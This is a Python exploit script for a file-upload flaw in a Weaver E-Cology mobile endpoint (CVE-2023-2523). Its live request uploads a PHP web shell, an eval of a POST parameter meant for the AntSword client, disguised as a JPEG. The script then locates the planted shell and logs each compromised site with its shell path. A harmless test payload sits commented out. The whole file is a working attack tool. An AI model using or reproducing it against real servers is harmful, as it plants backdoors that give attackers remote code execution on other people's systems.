import re
import requests
import time

class colors:
    # 定义颜色代码
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

filename = "./reps/E_Cology_mobile_upload_save_fileupCVE-2023-2523-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    }

def ecmusfileup(url):

    poc = '/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save'

    #测试
    data = '''------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
    Content-Disposition: form-data; name="upload_quwan"; filename="301939.php."
    Content-Type: image/jpeg

    <?php print(256* 256);?>
    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
    Content-Disposition: form-data; name="file"; filename=""
    Content-Type: application/octet-stream


    ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--'''

    #蚁剑
    yijian_data = '''------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="upload_quwan"; filename="test.php."
Content-Type: image/jpeg

<?php
eval($_POST["pass"]);
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream
 
 
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--'''
    try:
        reps = requests.post(url=url+poc, headers=headers, data=yijian_data, timeout=5)
        #reps = requests.post(url=url+poc, headers=headers, data=data, timeout=5)
        if reps.status_code == 200 and "test.php" in reps.text:
            #print(reps.text)
            matches = re.findall(r"(\d{10})", reps.text)
            shell_path = url + "/attachment/" + matches[1] + "/test.php"
            resps = requests.get(shell_path)
            if resps.status_code == 200 :
                print(colors.GREEN + f"存在E_Cology_mobile_upload_save_fileupCVE-2023-2523  shell_path : {shell_path} 默认shell_蚁剑_pass_base64_connect"+colors.END)
                f = open(filename,"a+",encoding="utf-8")
                f.write(f"{url} --> {shell_path}")
                f.write("\n")
                f.close()
            else:
                print(colors.RED+f"可能存在waf {url} "+colors.END)
    except Exception as e:
        print(colors.END + f"ERROR : {e}"+colors.END)
